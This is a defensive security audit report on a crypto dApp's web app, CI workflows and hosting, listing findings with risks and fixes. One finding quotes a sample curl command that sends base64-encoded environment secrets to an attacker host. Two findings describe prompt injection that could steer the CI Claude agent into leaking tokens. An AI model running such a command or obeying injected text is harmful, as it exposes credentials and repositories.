# Outcome — apps/web Web2 / supply-chain audit

- Method: 6-dimension multi-agent audit (40 agents), each reading real repo files, de-duped
  against #700, adversarially verified. 3 top findings hand-verified verbatim.
- Result: **33 findings verified · 31 NEW (not in #700) · 3 overlap #1556.**

## Top priorities

1. **HIGH (infra):** registrar lock + hardware 2FA + DNSSEC on sodax.com; Vercel SSO/2FA +
   deployment protection. Domain/hosting takeover bypasses all app code.
2. **`claude.yml` secret exfil (highest code/config severity):** the CI Claude action has
   `contents:write` + `CROSS_REPO_TOKEN` and `allowedTools` includes `Bash(env)` + `Bash(curl *)`
   + WebFetch, while processing attacker-influenceable PR/issue content → prompt-injection can
   dump + exfiltrate the PAT.
3. **CSP has no `default-src`/`connect-src`** → fetch/XHR/WebSocket exfil channel open,
   independent of the missing `script-src` (#1556).
4. **Actions pinned to mutable tags** (incl. the `pull_request_target` lint-pr) and **`.npmrc`
   runs dependency install scripts** (no `ignore-scripts`).
5. **Swap tx built server-side, signed client-side with no intent verification.**
6. **INFO but concrete:** Alchemy RPC key hardcoded in the client bundle (rotate); ToS
   off-chain signature replayable (no nonce/domain).

## Caveats

- Infra items are sound, applicable recommendations to action out-of-band (not code-verifiable).
- 3 findings overlap #1556 (CSP `script-src` family: GTM, Trusted Types, Turnstile) — don't re-file.

## Full findings

### HIGH

- **NEW** — **Domain registrar hardening for sodax.com (lock + 2FA + DNSSEC)** `infra` [infra-advisory]
  - Risk: A registrar-account takeover or unlocked domain lets an attacker re-point sodax.com to a wallet-drainer clone — the single highest-impact Web2 attack on a dApp, bypassing all app code. This is not verifiable from the repo and needs explicit controls.
  - Fix: Enable registrar transfer/update locks (clientTransferProhibited, clientUpdateProhibited, clientDeleteProhibited); require hardware-key (WebAuthn) 2FA on the registrar and DNS-provider accounts with no SMS fallback; use a role/company mailbox (not a personal Gmail) as registrant with its own MFA; enable DNSSEC at both registrar and the authoritative DNS; document who has registrar access and review quarterly.
- **NEW** — **Vercel account access controls + deployment protection** `infra` [infra-advisory]
  - Risk: A compromised Vercel team member or an over-broad token can ship a drainer build straight to production without touching git. Preview/non-prod hosts (dev/staging) are also live and could be indexed or used for phishing if unprotected.
  - Fix: Enforce SSO + mandatory 2FA on the Vercel team; use least-privilege member roles and restrict who can promote/alias production; enable Vercel Deployment Protection (Vercel Authentication or password) on preview + staging so only the team can load them; require Git integration to deploy only from a protected production branch; review the Vercel audit log regularly and rotate deploy tokens on personnel change.

### MEDIUM

- **NEW** — **CSP has no default-src fallback → connect-src is fully unrestricted (wallet-drainer exfiltration channel wide open)** `apps/web/next.config.js:18` [csp-headers]
  - Risk: In CSP, fetch directives inherit ONLY from default-src. With no default-src and no connect-src set, fetch/XHR/WebSocket/sendBeacon may target ANY host. For a signing dApp this is the exact channel a compromised npm dependency, a tampered GTM/Intercom tag, or an injected drainer uses to ship a captured signed transaction or seed material to an attacker server. It is independent of the missing script-src (#1556): even after a strict script-src/nonce lands, a legitimately-loaded-but-compromised third-party script would still be able to exfiltrate because there is no egress allowlist.
  - Fix: Add an explicit connect-src (and ideally a default-src 'self' baseline) enumerating the real egress set: Sodax API/backend, all chain RPC/relay endpoints (Sonic, EVM RPCs, Solana, Sui, Stellar horizon, ICON, WalletConnect relays), CoinGecko/GeckoTerminal, Vercel Blob, Notion/S3 image hosts, Turnstile, GTM/analytics, Intercom. connect-src is a host allowlist (far cheaper than the script-src nonce rollout) and can ship in Content-Security-Policy-Report-Only first to catch misses before enforcing.
- _known (new)_ — **Google Tag Manager loads mutable off-origin JavaScript on every page (including wallet-signing flows) with no SRI and no CSP script-src to constrain it** `apps/web/app/layout.tsx:161` [third-party-scripts-sri]
  - Risk: GTM is a live remote-code injection channel: whoever controls the GTM-W355PCS6 container (a compromised Google account, an insider, or a malicious/overbroad tag) can push arbitrary JavaScript to every visitor. Because the page hosts swap/stake/loan wallet-signing flows and the CSP defines no script-src or default-src, that injected code runs unrestricted and can silently rewrite transaction payloads or a Connect/approve prompt — the exact GTM-based drainer pattern seen across 2024-2026 incidents. SRI cannot pin GTM (versionless dynamic script), so the only real compensating control is a strict script-src allowlist, which is absent (the CSP nonce gap is tracked as #1556, but the third-party GTM asset itself and its SRI/allowlist status were not enumerated there).
  - Fix: Treat the GTM container as production infrastructure: lock down container edit/publish access (2FA + minimal editors), enable version approval, and restrict allowed tag types. In parallel, ship the #1556 CSP with an explicit script-src allowlist (self + googletagmanager.com + challenges.cloudflare.com + the exact Intercom/analytics origins GTM injects) plus nonce/strict-dynamic so a hijacked container cannot introduce a NEW off-origin script host. Consider serving GTM server-side (sGTM) to remove the browser-side arbitrary-code surface entirely.
- **NEW** — **Dependency install lifecycle scripts run by default (no ignore-scripts, no pnpm onlyBuiltDependencies allowlist) under pnpm 9** `.npmrc:1` [supply-chain]
  - Risk: pnpm 9.x (unlike pnpm 10) runs dependencies' preinstall/install/postinstall scripts by default. With no `ignore-scripts` and no `onlyBuiltDependencies` allowlist, any dep (or transitive dep) that ships a malicious postinstall executes arbitrary code during `pnpm install` — locally, in CI where secrets exist (CROSS_REPO_TOKEN, CLAUDE_CODE_OAUTH_TOKEN, NEWS_GIST_TOKEN), and in the Vercel deploy build. This is exactly the shai-hulud / chalk-debug / event-stream class of attack. --frozen-lockfile limits exposure to lockfile-bump time and local dev, but the repo has no allowlist to constrain which of the ~10 build-script packages may run.
  - Fix: Set `ignore-scripts=true` in .npmrc, then add an explicit `pnpm.onlyBuiltDependencies` allowlist in root package.json enumerating only the packages that genuinely need a build step (e.g. @biomejs/biome, @resvg/resvg-js, esbuild, keccak, secp256k1, sharp). This flips the model to default-deny so a newly-compromised transitive dep cannot silently run code on install. Consider bumping packageManager to pnpm 10 which makes this default-deny behavior native.
- **NEW** — **claude.yml: broad write permissions + cross-repo PAT exposed to an AI agent that can run curl/env/gh (prompt-injection exfiltration)** `.github/workflows/claude.yml:54` [cicd]
  - Risk: The action feeds issue/PR/review-comment bodies (and, via gh/git, PR diffs and cross-repo content) into an LLM that is granted a shell able to run `curl` to arbitrary URLs and dump `env`. A cross-repo PAT (CROSS_REPO_TOKEN) and the Claude OAuth token sit in that process env, and the GITHUB_TOKEN is contents:write. The `if:` gate only restricts WHO may type @claude (OWNER/MEMBER/COLLABORATOR); it does not sanitize the CONTENT Claude then ingests. Injected instructions embedded in a PR diff, a dependency file, another user's comment, or a linked cross-repo issue could direct Claude to `env` + `curl` the secrets to an attacker, or use the write-scoped token / PAT to push malicious commits.
  - Fix: Remove Bash(curl *) and Bash(env) from allowedTools to kill the trivial exfiltration path. Scope permissions down (drop contents:write unless commit-push is genuinely required). Replace the broad CROSS_REPO_TOKEN PAT with a fine-grained, read-only, repo-scoped token. Pin anthropics/claude-code-action to a full commit SHA.
- **NEW** — **Third-party GitHub Actions and CI container images pinned to mutable tags, not commit SHAs** `.github/workflows/security.yml:33` [cicd]
  - Risk: Every `uses:` and the semgrep `container.image` reference a mutable tag. A tag can be silently re-pointed to a malicious commit (the classic tj-actions/reviewdog-style compromise), yielding arbitrary code execution inside CI with access to whatever secrets/token that workflow holds. The third-party actions are the highest concern — especially amannn/action-semantic-pull-request, which per the finding above runs on pull_request_target with a privileged token, and anthropics/claude-code-action, which runs with a cross-repo PAT in env.
  - Fix: Pin every action to a full 40-char commit SHA (with a trailing `# vX.Y.Z` comment) and pin the semgrep container to an image digest (sha256:...). Enable Dependabot `package-ecosystem: github-actions` to bump the pinned SHAs safely.
- **NEW** — **Swap approve + intent transactions are built server-side by the Swaps API and signed/broadcast client-side with no verification that the returned tx matches the requested intent** `apps/web/lib/swaps-api-sign.ts:5` [wallet-tx-safety]
  - Risk: The swap flow POSTs the intent to https://api.sodax.com/v1/swaps/approve and /swaps/intents, then signs and broadcasts the raw tx the API returns (swap-confirm-dialog.tsx handleApprove signs result.value.tx at line ~212, handleSwapConfirm signs created.value.tx at line ~253 and re-submits the server's own intent via toIntentRequest(intent)). The client only schema-validates the shape — it never checks the tx's to/value/data/spender against what the user asked for. If api.sodax.com (its DNS, TLS, or a compromised backend) returns an arbitrary approve(attacker) or transfer(attacker) tx, the user signs and broadcasts it. On non-EVM spokes (Solana signAndSendTransaction, Sui signAndExecuteTxn, Stellar/Stacks/Injective/NEAR) the wallet cannot decode the raw payload for the user, so this is effective blind-signing of a fully server-controlled transaction — the drainer payoff step this audit targets.
  - Fix: Add client-side, defense-in-depth verification before signing any Swaps-API-returned tx: for EVM decode the calldata and assert tx.to is the expected AssetManager/token and the approve spender/amount match the intent; reject if the returned amount is unbounded or the target is unexpected. For non-EVM chains, surface a decoded, human-readable summary of the actual instruction set (recipient, token, amount) before the user signs rather than relying on schema shape alone.
- **NEW** — **CI Claude agent: indirect prompt-injection can exfiltrate cross-repo PAT + write to repos** `.github/workflows/claude.yml:58` [infra-advisory]
  - Risk: The @claude trigger is gated to OWNER/MEMBER/COLLABORATOR, but the DATA the agent then processes (PR diffs from external forks, issue bodies, and other icon-project repos it reads via `gh`) is attacker-controllable. Because the same job allows `Bash(env)` + `Bash(curl *)` while a cross-repo PAT (CROSS_REPO_TOKEN) and the Claude OAuth token sit in the process env, a single injected instruction (e.g. `curl https://attacker/?d=$(env|base64)`) exfiltrates both tokens; contents:write/pull-requests:write also let injected content push malicious commits across repos.
  - Fix: Drop `Bash(env)`, `Bash(curl *)`, `WebFetch`, `WebSearch` from allowedTools (or restrict curl to an allowlist); do not inject a broad cross-repo PAT into the agent env — use a fine-grained, single-repo, read-only token or the job GITHUB_TOKEN; reduce job permissions to the minimum the agent needs and require a second gate (label/approval) before it runs on PR content from forks.
- **NEW** — **DNS/certificate issuance monitoring + CAA for sodax.com** `infra` [infra-advisory]
  - Risk: Even with locks, a mis-issued certificate or a silently changed DNS record (subdomain takeover of the dev/staging hosts sodax-web-dev/staging.vercel.app) can enable phishing or MITM before anyone notices. Detection shrinks the window between hijack and response.
  - Fix: Publish a CAA record restricting issuance to the CA(s) Vercel actually uses; subscribe sodax.com (+ wildcards and the *.vercel.app preview hosts) to Certificate Transparency monitoring (Cert Spotter / crt.sh alerts) so any unexpected cert pages the team; add DNS-drift monitoring that alerts on any record change; verify no dangling CNAMEs point at de-provisioned hosts.
- **NEW** — **Build provenance and immutable-deploy guarantees** `infra` [infra-advisory]
  - Risk: Provenance gaps let a poisoned dependency or an unauthorized commit reach the production bundle. dApp users have no way to detect a tampered build once it is served from the trusted domain.
  - Fix: Require branch protection + required reviews + signed commits on the production branch; SHA-pin all CI actions (see finding above); consider pnpm minimumReleaseAge / a dependency-review gate on PRs; make the OSV-Scanner + Semgrep jobs blocking once the baseline is triaged (currently continue-on-error in security.yml:32 and no --error at line 61); keep a record of the deployed commit SHA for each production alias so an unexpected build is detectable.
- **NEW** — **Wallet-drainer / signing-surface monitoring and served-bundle integrity** `infra` [infra-advisory]
  - Risk: If the domain, a GTM tag, or a dependency is subverted, the injected code can silently swap transaction/approval parameters at signing time (the drainer pattern). With no script-src allowlist and no runtime screening, nothing detects or blocks it.
  - Fix: Integrate a transaction-security screening provider (e.g. Blockaid, Wallet Guard) into the signing flow to flag malicious approvals/transfers before the user signs; add an external monitor that hashes the served production JS bundle and alerts on any change outside a known deploy; lock down GTM (2FA on the container, restricted publish rights, minimal tag set) since GTM is an injection vector; prioritize the strict CSP script-src/connect-src rollout (#1556) so injected scripts cannot load or exfiltrate.
- **NEW** — **Censorship/hijack fallback (ENS+IPFS mirror) and documented incident kill-switch** `infra` [infra-advisory]
  - Risk: When a domain/hosting hijack happens, response speed determines loss. Users need a trustworthy alternate entry point and the team needs a pre-agreed way to disable signing and warn users within minutes, not hours.
  - Fix: Publish an ENS name + IPFS/Arweave build mirror as an authenticated fallback front-end and pin it in official channels; add a single env-flag kill-switch (mirroring the CONSENSUS_MIAMI_ENABLED pattern) that disables wallet-connect/transaction submission site-wide and shows a maintenance banner; pre-stage a Vercel Firewall Attack-Mode/maintenance rule; write an incident runbook covering registrar/DNS contacts, the user-comms channel, and any on-chain pause, and rehearse it.

### LOW

- **NEW** — **CSP sets no worker-src / child-src — Web/Service Workers spawnable from blob: or any origin** `apps/web/next.config.js:18` [csp-headers]
  - Risk: worker-src falls back through child-src → script-src → default-src; with none of those set, workers may be created from blob:/data:/any URL. Spawning a Worker from a blob: URL is a classic way to re-execute attacker-controlled JS outside the (future) script-src scope and to hold a long-lived exfiltration channel, so it undermines both #1556 and the connect-src fix once they land.
  - Fix: Add worker-src 'self' (drop blob: unless a first-party worker genuinely needs it, in which case scope it narrowly). Setting a default-src 'self' baseline would cover this and every other unset fetch directive (img-src, style-src, font-src, media-src, manifest-src) in one line.
- _known (new)_ — **No Trusted Types (require-trusted-types-for 'script' / trusted-types) despite known DOM-injection sinks** `apps/web/next.config.js:18` [csp-headers]
  - Risk: The app already has stored-XSS surfaces (JSON-LD news/partner and Notion/glossary render, tracked under #1556). Trusted Types would neutralize the dangerous DOM sinks (innerHTML / Range.createContextualFragment / script src assignment) that those payloads land in, providing enforcement even where output encoding is missed. It is the single strongest DOM-XSS mitigation and is entirely absent.
  - Fix: Roll out require-trusted-types-for 'script' plus a trusted-types policy allowlist (report-only first). Pair with a named policy for the sanitize-html / dangerouslySetInnerHTML paths so violations surface before enforcement.
- **NEW** — **Permissions-Policy only locks camera/microphone/geolocation — payment, sensors, and ad-topics APIs left at browser default** `apps/web/next.config.js:214` [csp-headers]
  - Risk: For a wallet dApp the allowlist should also deny payment=(), browsing-topics=()/interest-cohort=() (opt out of ad-topics profiling of DeFi users), and unused sensors (accelerometer, gyroscope, magnetometer, midi, bluetooth, serial). Leaving them unset means they run at the UA default (self/allow), a needlessly large surface for a malicious injected script and third-party iframes. Caveat: usb=() and hid=() must NOT be denied — Ledger and other hardware wallets rely on WebUSB/WebHID, so those two must stay allowed.
  - Fix: Extend to e.g. camera=(), microphone=(), geolocation=(), payment=(), browsing-topics=(), interest-cohort=(), accelerometer=(), gyroscope=(), magnetometer=(), midi=(), serial=(), bluetooth=() — deliberately keeping usb/hid allowed for hardware wallets, and fullscreen=(self) if the app uses fullscreen.
- **NEW** — **No CSP violation reporting (report-to / report-uri) and no Report-Only companion** `apps/web/next.config.js:18` [csp-headers]
  - Risk: Without a reporting endpoint the team is blind to CSP violations — both active injection attempts and legitimate third-party breakage. It also blocks a safe rollout path: report-only telemetry is how you build the connect-src/script-src allowlists (issue #1197 / #1556) without whack-a-mole. Currently there is no signal at all.
  - Fix: Add a report-to (with a Reporting-Endpoints header) or report-uri directive pointing at a collector, and stand up a Content-Security-Policy-Report-Only header to stage the stricter connect-src/script-src/worker-src/trusted-types directives before enforcing them.
- _known (new)_ — **Cloudflare Turnstile dynamically injects an off-origin script via createElement with no SRI and no nonce** `apps/web/components/partners/lead-magnet-hero.tsx:708` [third-party-scripts-sri]
  - Risk: The public partners lead-magnet page injects a third off-origin script origin at runtime. Cloudflare is reputable and Turnstile's endpoint is intentionally un-pinnable (so SRI is not applicable), but with no CSP script-src allowlist this is another unconstrained remote-code source: a compromise or DNS/CDN takeover of challenges.cloudflare.com would execute in the app's origin. frame-src already whitelists challenges.cloudflare.com for the iframe, but the api.js script itself has no script-src governance.
  - Fix: Add challenges.cloudflare.com to the strict script-src allowlist when #1556 lands (do not rely on default-src fallback, which is currently also unset). Optionally thread a per-request nonce into <Turnstile scriptOptions={{ nonce }}> so the injected tag is nonce-gated once a nonce-based CSP exists.
- **NEW** — **Security scanners (OSV-Scanner, Semgrep) are non-gating and their SARIF is never surfaced to code scanning** `.github/workflows/security.yml:32` [supply-chain]
  - Risk: The dependency-CVE and static-analysis scanning exists but is effectively passive: nothing fails the build, and findings never appear as PR annotations or in the repo Security tab — they are buried in a downloadable artifact nobody opens. A known-vulnerable dependency (e.g. esbuild@0.21.5 is present and matches GHSA-67mh-4wv8-2f99) or a Semgrep secret hit would merge unnoticed. The weekly OSV cron adds no alerting either.
  - Fix: Add a `github/codeql-action/upload-sarif` step for both SARIF outputs so findings surface in the Security tab / PR checks. After triaging the baseline, remove `continue-on-error` from OSV and add `--error` to Semgrep so newly-introduced vulnerable deps or high-severity findings gate PRs (the comments already state this is the intended end state).
- **NEW** — **Third-party GitHub Actions pinned to mutable tags, including a privileged pull_request_target workflow** `.github/workflows/lint-pr.yaml:14` [supply-chain]
  - Risk: Mutable version tags can be force-repointed to malicious commits (the tj-actions/changed-files March 2025 compromise did exactly this). Because lint-pr.yaml uses `pull_request_target`, the action executes in the base-repo context with a repo-scoped `GITHUB_TOKEN` even for forked PRs — a repointed `@v5.1.0` tag would run attacker code with that token. claude.yml additionally grants an @claude run a broad Bash allowlist including `curl *`, a potential exfil path (mitigated by the OWNER/MEMBER/COLLABORATOR gate).
  - Fix: Pin all third-party actions to full-length commit SHAs (keep the version in a trailing comment), especially for the `pull_request_target` workflow. Enable a Dependabot `github-actions` ecosystem update (once Dependabot is added) to keep the SHAs current.
- **NEW** — **lint-pr.yaml: pull_request_target trigger + no permissions block + third-party action on a mutable tag** `.github/workflows/lint-pr.yaml:4` [cicd]
  - Risk: pull_request_target runs in the BASE-repo context, so its GITHUB_TOKEN keeps the repository's default (typically read/write) scope even on fork PRs — unlike `pull_request`, which is read-only for forks. With no `permissions:` block the token stays broadly scoped and is handed to a third-party action pinned to a movable tag (@v5.1.0 can be re-pointed). A hijacked/re-tagged action would then execute in CI with a write-capable token. The one mitigant is that this job never runs actions/checkout, so no PR-controlled code is executed (the classic pull_request_target RCE path is absent) — the residual risk is the compromised-action-plus-privileged-token combination.
  - Fix: Add a least-privilege `permissions: { pull-requests: read }` block (raise to write only if the action posts a status/comment). Pin amannn/action-semantic-pull-request to a full 40-char commit SHA. Consider switching to the plain `pull_request` trigger since title validation does not need the elevated token.
- **NEW** — **ci.yml: no permissions block — build job's GITHUB_TOKEN inherits the repo-default (potentially read/write) scope** `.github/workflows/ci.yml:16` [cicd]
  - Risk: With no `permissions:` block the workflow token defaults to whatever the repository/org GITHUB_TOKEN default is, which can be read/write-all. A build/lint/type-check/build job only needs read access; a compromised dependency executed during `pnpm build` would otherwise run with a needlessly write-capable token.
  - Fix: Add a top-level `permissions: { contents: read }` to ci.yml (and adopt an org-wide read-only default GITHUB_TOKEN setting).
- **NEW** — **Approval amount and spender are never disclosed in the dapp UI; swap approval amount is server-determined and opaque** `apps/web/app/(apps)/swap/_components/swap-button.tsx:101` [wallet-tx-safety]
  - Risk: Every approve button shows only a token symbol or chain name — no allowance amount, no spender address, no 'this is a max/unlimited approval' warning. The user's only view of the amount/spender is the wallet popup. The on-chain SDK flows (stake/save/money-market/pool) request exact-amount approvals (verified: staking approve uses amount: params.amount, MM approve uses params.inputAmount), which is good, but the swap approval is built entirely server-side by the Swaps API and its amount is neither controlled nor shown by the frontend, so an unbounded (MaxUint256) approval would reach the user with zero in-app disclosure.
  - Fix: Display the approval amount and spender in the approve step (e.g. 'Approve exactly 100 USDC for SODAX AssetManager' vs an explicit 'Unlimited approval' badge), and for the swap flow show/enforce that the API-returned approval is bounded to the intent's inputAmount.
- **NEW** — **CI workflow has no top-level permissions block (default read-write GITHUB_TOKEN)** `.github/workflows/ci.yml:3` [infra-advisory]
  - Risk: Without an explicit permissions block the job receives the repo/org default GITHUB_TOKEN scope, which is often read-write. A malicious or compromised dependency executing during install/build (postinstall, transitive package) could then use that write-scoped token to tamper with the repository or releases.
  - Fix: Add `permissions: contents: read` at the workflow (or job) level so the build token is read-only; grant additional scopes only to the specific jobs that need them.
- **NEW** — **lint-pr uses pull_request_target with no permissions restriction** `.github/workflows/lint-pr.yaml:4` [infra-advisory]
  - Risk: `pull_request_target` runs in the base-repo context with access to secrets and a default read-write token even for PRs from forks. This job does not check out PR head code (limits the classic exploit), but the unrestricted token is broader than the title-validation task needs, and pull_request_target is the highest-risk trigger class if the step set ever grows to touch PR content.
  - Fix: Scope it down to `permissions: pull-requests: read` (the only scope the title validator needs) and keep it strictly to non-checkout, non-PR-code steps.
- **NEW** — **Third-party GitHub Actions pinned to mutable tags, not commit SHAs** `.github/workflows/claude.yml:52` [infra-advisory]
  - Risk: Tags are mutable: if a third-party action's publisher account is compromised (a repeated 2024-2026 attack pattern, e.g. tj-actions/changed-files), an attacker can re-point the tag to malicious code that runs in CI with repo/secret access. SHA pinning removes this class of hijack.
  - Fix: Pin every third-party action to a full commit SHA (with the version in a trailing comment) and enable Dependabot for GitHub Actions to bump the SHAs; first-party actions/* can stay on major tags but SHA-pinning them too is stronger.
- **NEW** — **Secret scoping, marking, and rotation for Vercel env vars** `infra` [infra-advisory]
  - Risk: If these are readable in the Vercel UI, shared into Preview unnecessarily, or long-lived, a single account/token compromise leaks the DB, mail sending, OAuth, and AI billing at once. Preview scope is especially risky because previews are lower-trust.
  - Fix: Mark each secret as Sensitive (encrypted, non-readable) in Vercel; scope Production-only secrets to Production and never to Preview; use a separate Mongo user/DB and separate API keys for preview/staging; establish a rotation cadence and rotate immediately on any team change; confirm no secret is accidentally prefixed NEXT_PUBLIC_ (repo currently clean).

### INFO

- **NEW** — **Cross-Origin-Embedder-Policy absent — page is not cross-origin isolated (acceptable, noted)** `apps/web/next.config.js:217` [csp-headers]
  - Risk: COOP is correctly set to same-origin-allow-popups (right choice for wallet-connect/OAuth popups). COEP is absent, so the document is not cross-origin isolated. This is a reasonable trade-off — require-corp COEP would break the many cross-origin third-party resources (wallet SDKs, CoinGecko images, Intercom, Turnstile) — so this is flagged as a conscious gap, not a defect. HSTS (max-age=63072000; includeSubDomains; preload), X-Content-Type-Options: nosniff, and Referrer-Policy: strict-origin-when-cross-origin are all correctly configured, and the CSP correctly applies to all routes via source '/(.*)'.
  - Fix: No action required unless SharedArrayBuffer / high-resolution timers are needed. If pursued later, adopt COEP: credentialless (less breakage than require-corp) behind report-only first.
- **NEW** — **Intercom messenger runs site-wide but is loaded only via the GTM container (no boot code / no package) — a second undocumented off-origin vendor with no SRI** `apps/web/components/shared/intercom/intercom-mobile-offset-fix.tsx:1` [third-party-scripts-sri]
  - Risk: This demonstrates the GTM container is not just analytics — it already injects at least one additional vendor's remote code (Intercom) into every page. It expands the trusted-third-party attack surface (an Intercom CDN/config compromise, or a swapped Intercom app_id, would run JS on wallet pages) and it means the site's full third-party-JS inventory is not visible in source review — it lives in the GTM container, which is exactly why locking down GTM (Finding: GTM) matters.
